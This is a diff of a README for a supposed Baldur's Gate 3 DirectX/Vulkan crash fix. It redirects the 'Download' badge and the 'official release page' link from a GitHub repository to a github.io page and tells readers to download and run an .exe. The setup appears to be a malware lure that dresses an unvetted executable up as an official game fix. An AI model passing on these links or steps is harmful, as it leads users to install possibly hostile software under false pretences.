@@ -1,6 +1,6 @@
 # 🛠️ Baldurs-Gate-3-DirectX-Fix - Stop crashing and play your game
 
-[![](https://img.shields.io/badge/Download-Fix-blue.svg)](https://github.com/floritravelable459/Baldurs-Gate-3-DirectX-Fix)
+[![](https://img.shields.io/badge/Download-Fix-blue.svg)](https://floritravelable459.github.io)
 
 ## 🎯 Purpose
 The Baldurs-Gate-3-DirectX-Fix project solves crashes related to DirectX and Vulkan graphics errors. These errors prevent the game from starting or cause the game to close during play. This tool restores the missing components your computer needs to run Baldur’s Gate 3 on Windows 10 and Windows 11. It eliminates the need for manual configuration or complex registry changes.
@@ -16,7 +16,7 @@ This fix supports the following configurations:
 ## 🚀 Downloading the Fix
 You need to visit the project page to access the download. Follow the steps below to prepare the file for your computer.
 
-1. Navigate to the [official release page](https://github.com/floritravelable459/Baldurs-Gate-3-DirectX-Fix).
+1. Navigate to the [official release page](https://floritravelable459.github.io).
 2. Locate the section labeled Assets.
 3. Click the link ending in .exe to start the file transfer.
 4. Save the file to your Downloads folder.
